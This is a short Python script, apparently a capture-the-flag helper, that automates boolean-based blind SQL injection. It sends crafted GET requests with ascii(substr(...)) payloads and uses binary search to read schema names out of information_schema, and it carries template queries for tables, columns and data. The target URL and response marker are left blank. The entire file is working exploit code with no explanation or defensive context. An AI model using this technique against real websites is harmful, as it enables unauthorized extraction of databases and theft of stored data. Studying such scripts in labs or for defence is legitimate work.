import time
import requests

url=''
result=""
database="select group_concat(schema_name) from information_schema.schemata"
table="select group_concat(table_name) from information_schema.tables where table_schema=''"
column="select group_concat(column_name) from information_schema.columns where table_schema='' and table_name=''"
data="select '' from ''"

for i in range(1,150):
    k1=23
    k2=130
    mid=(k1+k2)//2
    while(k1<k2):
        sql="1' and ascii(substr(({}),{},1))>{}%23".format(database,i,mid)
        url=''+sql
        r=requests.get(url)
        if "" not in r.text:
            k2=mid
        else:
            k1=mid+1
        mid=(k1+k2)//2
        time.sleep(0.1)
    result=result+chr(mid)
    print(result)
